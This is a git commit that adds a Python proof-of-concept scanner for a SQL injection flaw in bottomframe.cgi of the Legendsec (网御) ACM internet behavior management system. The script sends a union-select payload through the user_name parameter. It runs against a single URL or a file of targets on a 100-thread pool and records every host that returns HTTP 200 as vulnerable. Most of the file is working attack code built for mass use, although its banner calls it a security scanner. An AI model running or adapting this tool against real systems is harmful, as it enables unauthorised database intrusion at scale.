0e5b0d1ff69a7f4dac288603ffc4d2e648239045
秋喜秋 <2071793763@qq.com>
2024-09-13 14:15:30 +0800

    Add files via upload

---
+++ 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞.py
@@ -0,0 +1,72 @@
+# 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞
+# 导包外置
+import requests, argparse, sys
+from multiprocessing.dummy import Pool
+
+# 关闭告警
+requests.packages.urllib3.disable_warnings()
+
+
+def banner():
+    test = """
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                                                                              │
+│                         ┌─────────────────────────────────────┐              │
+│                         │               ( •_•)                │              │
+│                         │              / ︻╦╤─                               
+│                         │             | 网御 ACM 上网行为管理系统漏洞安全漏洞扫描工具                
+│                         │              \─╤╦═                  │              │
+│                         └─────────────────────────────────────┘              │
+│                                                                              │
+│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
+│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-9-13  
+│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+"""
+    print(test)
+
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description="网御 ACM 上网行为管理系统")
+    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list = []
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for i in fp.readlines():
+                url_list.append(i.strip().replace('\n', ''))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python {sys.argv[0]} -h")
+
+
+def poc(target):
+    payload = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
+    proxies = {
+        'http': 'http://127.0.0.1:8080',
+        'https': 'http://127.0.0.1:8080'
+    }
+
+    try:
+        res1 = requests.get(url=target + payload, timeout=10, verify=False, proxies=proxies)
+        if res1.status_code == 200:
+            print(f"[+]该url:{target}存在漏洞")
+            with open('result41.txt', 'a', encoding='utf-8') as fp:
+                fp.write(f"{target}" + "\n")
+        else:
+            print(f'[-]该url:{target}不存在漏洞')
+    except:
+        print(f'[-]该url:{target}该站点存在问题')
+
+
+if __name__ == '__main__':
+    main()
